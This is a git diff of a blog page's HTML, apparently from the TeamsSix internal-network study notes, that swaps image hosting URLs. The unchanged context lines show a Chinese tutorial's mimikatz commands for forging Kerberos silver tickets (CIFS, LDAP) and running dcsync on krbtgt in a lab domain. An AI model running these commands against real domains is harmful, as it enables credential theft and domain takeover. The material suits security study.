@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110091330529.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-10-09
+                    2021-11-22
                 </div>
                 
 
@@ -499,7 +499,7 @@ kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <p>使用 mimikatz 生成伪造的白银票据</p>
 <pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>​    <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>​    <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110091330529.png"></p>
 <p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p>
 <h2 id="2、伪造-LDAP-服务权限"><a href="#2、伪造-LDAP-服务权限" class="headerlink" title="2、伪造 LDAP 服务权限"></a>2、伪造 LDAP 服务权限</h2><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p>
 <pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;dc:dc &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -508,7 +508,7 @@ kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <p>接下来生成 LDAP 服务的白银票据</p>
 <pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091403286.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110091403286.png"></p>
 <blockquote>
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1760135">https://cloud.tencent.com/developer/article/1760135</a></p>
@@ -517,7 +517,7 @@ kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <p><a target="_blank" rel="noopener" href="https://teamssix.com/211009-145524.html">https://teamssix.com/211009-145524.html</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -669,7 +669,7 @@ kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span><
                 <a href="/211022-122217.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png" class="responsive-img" alt="【内网学习笔记】30、跨域安全（完结）">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110091330529.png" class="responsive-img" alt="【内网学习笔记】30、跨域安全（完结）">
                         
                         <span class="card-title">【内网学习笔记】30、跨域安全（完结）</span>
                     </div>
@@ -725,7 +725,7 @@ kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span><
                 <a href="/210927-163036.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109271559013.png" class="responsive-img" alt="【内网学习笔记】28、黄金票据">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109271559013.png" class="responsive-img" alt="【内网学习笔记】28、黄金票据">
                         
                         <span class="card-title">【内网学习笔记】28、黄金票据</span>
                     </div>
